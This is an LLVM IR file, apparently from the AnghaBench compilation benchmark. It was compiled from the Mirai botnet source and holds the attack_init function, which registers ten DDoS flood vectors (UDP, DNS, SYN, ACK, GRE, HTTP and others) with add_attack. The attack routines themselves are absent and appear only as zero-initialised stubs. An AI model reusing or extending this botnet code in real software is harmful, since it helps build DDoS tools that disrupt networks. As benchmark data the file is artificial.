; ModuleID = '/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack.c_attack_init.c'
source_filename = "/home/carl/AnghaBench/Mirai-Source-Code/mirai/bot/extr_attack.c_attack_init.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ATK_VEC_UDP = common dso_local global i32 0, align 4
@attack_udp_generic = common dso_local global i64 0, align 8
@ATK_VEC_VSE = common dso_local global i32 0, align 4
@attack_udp_vse = common dso_local global i64 0, align 8
@ATK_VEC_DNS = common dso_local global i32 0, align 4
@attack_udp_dns = common dso_local global i64 0, align 8
@ATK_VEC_UDP_PLAIN = common dso_local global i32 0, align 4
@attack_udp_plain = common dso_local global i64 0, align 8
@ATK_VEC_SYN = common dso_local global i32 0, align 4
@attack_tcp_syn = common dso_local global i64 0, align 8
@ATK_VEC_ACK = common dso_local global i32 0, align 4
@attack_tcp_ack = common dso_local global i64 0, align 8
@ATK_VEC_STOMP = common dso_local global i32 0, align 4
@attack_tcp_stomp = common dso_local global i64 0, align 8
@ATK_VEC_GREIP = common dso_local global i32 0, align 4
@attack_gre_ip = common dso_local global i64 0, align 8
@ATK_VEC_GREETH = common dso_local global i32 0, align 4
@attack_gre_eth = common dso_local global i64 0, align 8
@ATK_VEC_HTTP = common dso_local global i32 0, align 4
@attack_app_http = common dso_local global i64 0, align 8
@TRUE = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @attack_init() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @ATK_VEC_UDP, align 4
  %3 = load i64, i64* @attack_udp_generic, align 8
  %4 = trunc i64 %3 to i32
  %5 = call i32 @add_attack(i32 %2, i32 %4)
  %6 = load i32, i32* @ATK_VEC_VSE, align 4
  %7 = load i64, i64* @attack_udp_vse, align 8
  %8 = trunc i64 %7 to i32
  %9 = call i32 @add_attack(i32 %6, i32 %8)
  %10 = load i32, i32* @ATK_VEC_DNS, align 4
  %11 = load i64, i64* @attack_udp_dns, align 8
  %12 = trunc i64 %11 to i32
  %13 = call i32 @add_attack(i32 %10, i32 %12)
  %14 = load i32, i32* @ATK_VEC_UDP_PLAIN, align 4
  %15 = load i64, i64* @attack_udp_plain, align 8
  %16 = trunc i64 %15 to i32
  %17 = call i32 @add_attack(i32 %14, i32 %16)
  %18 = load i32, i32* @ATK_VEC_SYN, align 4
  %19 = load i64, i64* @attack_tcp_syn, align 8
  %20 = trunc i64 %19 to i32
  %21 = call i32 @add_attack(i32 %18, i32 %20)
  %22 = load i32, i32* @ATK_VEC_ACK, align 4
  %23 = load i64, i64* @attack_tcp_ack, align 8
  %24 = trunc i64 %23 to i32
  %25 = call i32 @add_attack(i32 %22, i32 %24)
  %26 = load i32, i32* @ATK_VEC_STOMP, align 4
  %27 = load i64, i64* @attack_tcp_stomp, align 8
  %28 = trunc i64 %27 to i32
  %29 = call i32 @add_attack(i32 %26, i32 %28)
  %30 = load i32, i32* @ATK_VEC_GREIP, align 4
  %31 = load i64, i64* @attack_gre_ip, align 8
  %32 = trunc i64 %31 to i32
  %33 = call i32 @add_attack(i32 %30, i32 %32)
  %34 = load i32, i32* @ATK_VEC_GREETH, align 4
  %35 = load i64, i64* @attack_gre_eth, align 8
  %36 = trunc i64 %35 to i32
  %37 = call i32 @add_attack(i32 %34, i32 %36)
  %38 = load i32, i32* @ATK_VEC_HTTP, align 4
  %39 = load i64, i64* @attack_app_http, align 8
  %40 = trunc i64 %39 to i32
  %41 = call i32 @add_attack(i32 %38, i32 %40)
  %42 = load i32, i32* @TRUE, align 4
  ret i32 %42
}

declare dso_local i32 @add_attack(i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
